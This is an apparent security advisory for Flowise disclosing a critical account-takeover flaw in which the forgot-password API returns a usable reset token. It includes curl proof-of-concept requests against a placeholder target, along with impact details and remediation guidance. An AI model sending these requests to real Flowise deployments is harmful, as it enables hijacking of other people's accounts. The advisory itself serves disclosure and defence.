  "details": "### Summary\n\nThe `forgot-password` endpoint in Flowise returns sensitive information including a valid password reset `tempToken` without authentication or verification. This enables any attacker to generate a reset token for arbitrary users and directly reset their password, leading to a complete **account takeover (ATO)**.\n\nThis vulnerability applies to **both the cloud service (`cloud.flowiseai.com`) and self-hosted/local Flowise deployments** that expose the same API.\n\n**CVSS v3.1 Base Score:** **9.8 (Critical)**\n**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`\n\n---\n\n### Details\n\n* The endpoint `/api/v1/account/forgot-password` accepts an email address as input.\n* Instead of only sending a reset email, the API **responds directly with sensitive user details**, including:\n\n  * User ID, name, email, hashed credential, status, timestamps.\n  * **A valid `tempToken` and its expiry**, which is intended for password reset.\n* This `tempToken` can then be reused immediately in the `/api/v1/account/reset-password` endpoint to reset the password of the targeted account **without any email verification** or user interaction.\n* Exploitation requires only the victim\u2019s email address, which is often guessable or discoverable.\n* Because the vulnerable endpoints exist in both **Flowise Cloud** and **local/self-hosted deployments**, any exposed instance is vulnerable to account takeover.\n\nThis effectively allows any unauthenticated attacker to **take over arbitrary accounts** (including admin or privileged accounts) by requesting a reset for their email.\n\n---\n\n### PoC\n\n1. **Request a reset token for the victim**\n\n```bash\ncurl -i -X POST https://<target>/api/v1/account/forgot-password \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"user\":{\"email\":\"<victim@example.com>\"}}'\n```\n\n**Response (201 Created):**\n\n```json\n{\n  \"user\": {\n    \"id\": \"<redacted-uuid>\",\n    \"name\": \"<redacted>\",\n    \"email\": \"<victim@example.com>\",\n    \"credential\": \"<redacted-hash>\",\n    \"tempToken\": \"<redacted-tempToken>\",\n    \"tokenExpiry\": \"2025-08-19T13:00:33.834Z\",\n    \"status\": \"active\"\n  }\n}\n```\n\n2. **Use the exposed `tempToken` to reset the password**\n\n```bash\ncurl -i -X POST https://<target>/api/v1/account/reset-password \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n        \"user\":{\n          \"email\":\"<victim@example.com>\",\n          \"tempToken\":\"<redacted-tempToken>\",\n          \"password\":\"NewSecurePassword123!\"\n        }\n      }'\n```\n\n**Expected Result:** `200 OK`\nThe victim\u2019s account password is reset, allowing full login.\n\n---\n\n### Impact\n\n* **Type:** Authentication bypass / Insecure direct object exposure.\n* **Impact:**\n\n  * Any account (including administrator or high-value accounts) can be reset and taken over with only the email address.\n  * Applies to **both Flowise Cloud and locally hosted/self-managed deployments**.\n  * Leads to full account takeover, data exposure, impersonation, and possible control over organizational assets.\n  * High likelihood of exploitation since no prior access or user interaction is required.\n\n---\n\n### Recommended Remediation\n\n* **Do not return reset tokens** or sensitive account details in API responses. Tokens must only be delivered securely via the registered email channel.\n* Ensure `forgot-password` responds with a generic success message regardless of input, to avoid user enumeration.\n* Require strong validation of the `tempToken` (e.g., single-use, short expiry, tied to request origin, validated against email delivery).\n* Apply the same fixes to **both cloud and self-hosted/local deployments**.\n* Log and monitor password reset requests for suspicious activity.\n* Consider multi-factor verification for sensitive accounts.\n\n\nCredit\n\n---\n\n\u26a0\ufe0f This is a **Critical ATO vulnerability** because it allows attackers to compromise any account with only knowledge of an email address, and it applies to **all deployment models (cloud and local)**.\n\n---",
